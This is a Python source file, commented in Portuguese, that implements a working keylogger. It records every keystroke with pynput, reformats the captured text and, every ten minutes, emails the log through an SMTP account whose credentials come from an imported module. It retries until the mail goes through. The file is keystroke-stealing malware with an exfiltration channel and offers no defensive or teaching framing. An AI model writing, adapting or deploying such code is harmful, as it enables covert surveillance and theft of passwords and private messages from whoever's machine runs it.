import requests, smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput.keyboard import Key, Listener, Controller
from user import usuario, senha
from time import sleep
import threading

teclado = Controller()  # Controlador de teclado
letras_com_aspas = []  # Variável que irá armazenar todas as letras pressionadas
letras_formatadas = []  # Váriavel que irá armazenar as letras formatadas para serem concatenadas antes de enviar


def tecla_pressionada(tecla):
    global cronometro_finalizou
    # Executa quando alguma tecla é pressionada
    try:
        # Se o cronômetro finalizar, não irá receber mais teclas até a mensagem ser enviada
        if cronometro_finalizou:
            pass
        else:
            if tecla == Key.esc:
                pass
            else:
                print(f"A tecla pressionada foi {tecla}")
                letras_com_aspas.append(tecla)

    except AttributeError:
        print(f"A tecla especial pressionada foi {tecla}")


def tempo_de_envio(n):
    global cronometro_finalizou
    # Quando o cronometro em segundo plano é encerrado, retorna False para o método "on_release" e envia a mensagem
    if cronometro_finalizou:
        return False

# A função abaixo não é usada no código, foi apenas um teste para a captura de teclas antes de enviar para o e-mail
# def escrever(letras):
#     # Escrever no arquivo
#     with open("log.txt", "a", encoding="UTF-8") as arquivo:
#         for letra in letras:
#             letra = str(letra).replace("'", "")
#             if letra == "Key.space":
#                 arquivo.write(" ")
#             elif letra == "Key.enter":
#                 arquivo.write("\n")
#             elif letra == "Key.tab":
#                 arquivo.write("    ")
#             else:
#                 arquivo.write(letra)


def formatar_letras(letras):
    global letras_formatadas

    # Trasnforma a letra em String e percorre a mesma "excluindo" com o replace, as aspas que são retornadas pelo pynput
    for letra in letras:
        letra = str(letra).replace("'", "")
        if letra == "Key.space":
            letras_formatadas.append(" ")
        elif letra == "Key.enter":
            letras_formatadas.append("\n")
        elif letra == "Key.tab":
            letras_formatadas.append("    ")
        elif letra == "Key.shift" or letra == "Key.shift_r":
            letras_formatadas.append(" (shift) ")
        elif letra == "Key.caps_lock":
            letras_formatadas.append("")
        elif letra == "Key.ctrl_l" or letra == "Key.ctrl_r":
            letras_formatadas.append("")
        elif letra == "Key.menu":
            letras_formatadas.append("")
        elif letra == "Key.alt_l" or letra == "Key.alt_gr":
            letras_formatadas.append("")
        elif letra == "Key.print_sreen":
            letras_formatadas.append(" (tirou print) ")
        elif letra == "Key.backspace":
            letras_formatadas.pop()
        else:
            letras_formatadas.append(letra)


def juntar_letras(enviar):
    # Junta as mensagem que foram armazendas na lista em uma única String para ser enviada
    enviar = "".join(enviar)
    return enviar


def conexao_internet():
    try:
        # Tentar fazer uma requisição com algum servidor online
        requisicao = requests.get("https://www.google.com")
        if requisicao.status_code == 200:
            # Retorna True se a solicitação estiver OK
            return True
        else:
            # Retorna False se a solicitação NÃO estiver OK
            return False
    except (requests.ConnectionError, requests.exceptions.MissingSchema):
        # Apresentar a mensagem de erro se a conexão falhar
        print("Não foi possível se conectar ao servidor")


def enviar_email():
    global letras_com_aspas, letras_formatadas, tempo_total, cronometro_finalizou, mensagem_final
    # Credenciais de login
    USUARIO = usuario
    SENHA = senha

    # Remetente e Destinatário
    REMETENTE = USUARIO
    DESTINATARIO = USUARIO

    # Mensagem para enviar
    assunto_mensagem = "Log"
    mensagem = mensagem_final

    # Configurando servidor smtp
    servidor_smtp = "smtp.servidor.com/ru"
    porta_smtp = 587

    try:
        # Cria uma conexão com o servidor
        estabelecer_conexao = smtplib.SMTP(servidor_smtp)

        # Fazendo login na conta
        estabelecer_conexao.login(USUARIO, SENHA)

        # Criando mensagem para enviar
        msg = MIMEMultipart()
        msg["From"] = REMETENTE
        msg["To"] = DESTINATARIO
        msg["Subject"] = assunto_mensagem

        # Adicionando corpo do texto
        msg.attach(MIMEText(mensagem, 'plain'))

        # Enviando o e-mail
        estabelecer_conexao.sendmail(REMETENTE, DESTINATARIO, msg.as_string())
        print("Mensagem enviada")

        # Apaga os caracteres salvos na lista
        letras_com_aspas = []
        letras_formatadas = []

        # Inicia novamente o cronometro
        cronometro_finalizou = False
        tempo_total = threading.Thread(target=cronometro)
        tempo_total.start()

        # Se a mensagem for realmente enviada, retorna True, para sair do loop
        return True

    except Exception as erro:
        print(f"Ocorreu um erro de envio {erro}")


def cronometro():
    global cronometro_finalizou
    # Cronometro inicia em segundo plano, enquanto captura as teclas
    timer = 600
    for t in range(600):
        timer -= 1
        sleep(1)

    print("Tempo acabou")
    cronometro_finalizou = True

    # Tecla qualquer sendo liberada pelo proprio programa para retornar False para o método "on_release"
    teclado.release(Key.esc)

    # Atribua False à variável global quando o cronômetro terminar


cronometro_finalizou = False
threading.Thread(target=cronometro).start()

verificar_teclas = Listener  # váriavel instanciada (objeto) da classe Listerner
while True:
    # "Abre" a classe para receber duas funções como argumento para os atributos "on_press" e "on_release" chamando esse
    # procedimento de "verificar"
    with verificar_teclas(on_press=tecla_pressionada, on_release=tempo_de_envio) as verificar:
        # Inicia o o procedimento "verificar" a partir da função join() do pynput
        verificar.join()

    # Formata as letras que são capturadas
    formatar_letras(letras_com_aspas)

    # atribui à variável mensagem_final as letras formatadas que foram encaminhdas para a função juntar_letras()
    mensagem_final = juntar_letras(letras_formatadas)

    # Verifica se o tamanho da mensagem é maior ou igual a 1 caracter e se a conexão da internet está ok
    if len(mensagem_final) >= 1 and conexao_internet():
        # Se tudo estiver ok, entra no loop para enviar o e-mail. O loop serve para garantir que a mensagem seja enviada
        # Ou seja, se der algum erro de spam (por exemplo), ele tenta enviar a mensagem de novo.
        while True:
            if enviar_email():
                break
            enviar_email()

    else:
        cronometro_finalizou = False
        tempo_total = threading.Thread(target=cronometro)
        tempo_total.start()
